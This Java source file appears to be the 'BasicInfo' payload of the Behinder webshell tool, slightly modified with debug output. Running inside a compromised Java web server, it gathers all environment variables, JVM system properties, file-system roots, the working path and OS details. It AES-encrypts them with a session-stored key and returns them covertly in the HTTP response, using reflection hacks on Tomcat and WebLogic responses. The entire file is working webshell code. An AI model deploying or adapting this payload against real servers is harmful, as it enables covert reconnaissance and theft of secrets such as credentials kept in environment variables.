package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.Map.Entry;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class BasicInfo {
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public void test_getOutputStream(String result) throws Exception {
        Class clazz = this.Response.getClass();
        System.out.println(clazz);
        if (clazz.equals(org.apache.catalina.connector.ResponseFacade.class)) {
            System.out.println("is tomcat");
            java.lang.reflect.Field field_response = this.Response.getClass().getDeclaredField("response");
            field_response.setAccessible(true);
            Object res = field_response.get(this.Response);
            System.out.println(res);
            java.lang.reflect.Field field_usingWriter = res.getClass().getDeclaredField("usingWriter");
            field_usingWriter.setAccessible(true);
            System.out.println(field_usingWriter.getBoolean(res));
            if (field_usingWriter.getBoolean(res)) {
                System.out.println("invoke flushBuffer() && set usingWriter=false");
                this.Response.getClass().getMethod("flushBuffer").invoke(this.Response);
                field_usingWriter.setBoolean(res, false);
                System.out.println(field_usingWriter.getBoolean(res));
            }
        } else if (clazz.toString().equals("class weblogic.servlet.internal.ServletResponseImpl")) {
            System.out.println("is weblogic");
            Method method = this.Response.getClass().getDeclaredMethod("resetOutputState");
            method.setAccessible(true);
            method.invoke(this.Response);
        } else {
            System.out.println("i don't know");
        }
        Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
        Method write = so.getClass().getMethod("write", byte[].class);
        write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
        so.getClass().getMethod("flush").invoke(so);
        so.getClass().getMethod("close").invoke(so);
//            so = this.Response.getClass().getMethod("getWriter").invoke(this.Response);
//            write = so.getClass().getMethod("write", String.class);
//            write.invoke(so, new String(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))));
//            write.invoke(so, this.Encrypt("".getBytes("UTF-8")));
//            so.getClass().getMethod("flush").invoke(so);
//            so.getClass().getMethod("close").invoke(so);
    }

    public boolean equals(Object obj) {
        System.out.println("invoke BasicInfo.equals()");
        String result = "";
        boolean var22 = false;

        Object so;
        Method write;
        label132:
        {
            try {
                var22 = true;
                this.fillContext(obj);
                StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
                Map<String, String> env = System.getenv();
                Iterator var5 = env.keySet().iterator();

                while (var5.hasNext()) {
                    String name = (String) var5.next();
                    basicInfo.append(name + "=" + (String) env.get(name) + "<br/>");
                }

                basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
                Properties props = System.getProperties();
                Set<Entry<Object, Object>> entrySet = props.entrySet();
                Iterator var7 = entrySet.iterator();

                while (var7.hasNext()) {
                    Entry<Object, Object> entry = (Entry) var7.next();
                    basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
                }

                String currentPath = (new File("")).getAbsolutePath();
                String driveList = "";
                File[] roots = File.listRoots();
                File[] var10 = roots;
                int var11 = roots.length;

                for (int var12 = 0; var12 < var11; ++var12) {
                    File f = var10[var12];
                    driveList = driveList + f.getPath() + ";";
                }

                String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
                Map<String, String> entity = new HashMap();
                entity.put("basicInfo", basicInfo.toString());
                entity.put("currentPath", currentPath);
                entity.put("driveList", driveList);
                entity.put("osInfo", osInfo);
                entity.put("arch", System.getProperty("os.arch"));
                result = this.buildJson(entity, true);
                var22 = false;
                break label132;
            } catch (Exception var26) {
                var22 = false;
            } finally {
                if (var22) {
                    try {
//                        so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
//                        write = so.getClass().getMethod("write", byte[].class);
//                        write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
//                        so.getClass().getMethod("flush").invoke(so);
//                        so.getClass().getMethod("close").invoke(so);
                        test_getOutputStream(result);
                    } catch (Exception var23) {
                    }

                }
            }

            try {
//                so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
//                write = so.getClass().getMethod("write", byte[].class);
//                write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
//                so.getClass().getMethod("flush").invoke(so);
//                so.getClass().getMethod("close").invoke(so);
                test_getOutputStream(result);
            } catch (Exception var24) {
            }

            return true;
        }

        try {
//            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
//            write = so.getClass().getMethod("write", byte[].class);
//            write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
//            so.getClass().getMethod("flush").invoke(so);
//            so.getClass().getMethod("close").invoke(so);
            test_getOutputStream(result);
        } catch (Exception var25) {
        }

        return true;
    }

    public boolean e(Object r, Object w) {
        System.out.println("invoke BasicInfo.e()");
        String result = "";
        boolean var22 = false;

        Object so;
        Method write;
        label132:
        {
            try {
                var22 = true;

                this.Request = r;
                this.Response = w;
                this.Session = r.getClass().getMethod("getSession").invoke(r);
                this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");

                StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
                Map<String, String> env = System.getenv();
                Iterator var5 = env.keySet().iterator();

                while (var5.hasNext()) {
                    String name = (String) var5.next();
                    basicInfo.append(name + "=" + (String) env.get(name) + "<br/>");
                }

                basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
                Properties props = System.getProperties();
                Set<Entry<Object, Object>> entrySet = props.entrySet();
                Iterator var7 = entrySet.iterator();

                while (var7.hasNext()) {
                    Entry<Object, Object> entry = (Entry) var7.next();
                    basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
                }

                String currentPath = (new File("")).getAbsolutePath();
                String driveList = "";
                File[] roots = File.listRoots();
                File[] var10 = roots;
                int var11 = roots.length;

                for (int var12 = 0; var12 < var11; ++var12) {
                    File f = var10[var12];
                    driveList = driveList + f.getPath() + ";";
                }

                String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
                Map<String, String> entity = new HashMap();
                entity.put("basicInfo", basicInfo.toString());
                entity.put("currentPath", currentPath);
                entity.put("driveList", driveList);
                entity.put("osInfo", osInfo);
                entity.put("arch", System.getProperty("os.arch"));
                result = this.buildJson(entity, true);
                var22 = false;
                break label132;
            } catch (Exception var26) {
                var22 = false;
            } finally {
                if (var22) {
                    try {
                        test_getOutputStream(result);
                    } catch (Exception var23) {
                    }

                }
            }

            try {
                test_getOutputStream(result);
            } catch (Exception var24) {
            }

            return true;
        }

        try {
            test_getOutputStream(result);
        } catch (Exception var25) {
        }

        return true;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        Iterator var5 = entity.keySet().iterator();

        while (var5.hasNext()) {
            String key = (String) var5.next();
            sb.append("\"" + key + "\":\"");
            String value = ((String) entity.get(key)).toString();
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
            this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
            this.Session = obj.getClass().getMethod("getSession").invoke(obj);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }

        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
}
